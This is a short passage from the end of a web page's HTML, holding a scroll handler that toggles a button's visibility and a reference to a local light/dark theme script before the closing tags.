            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
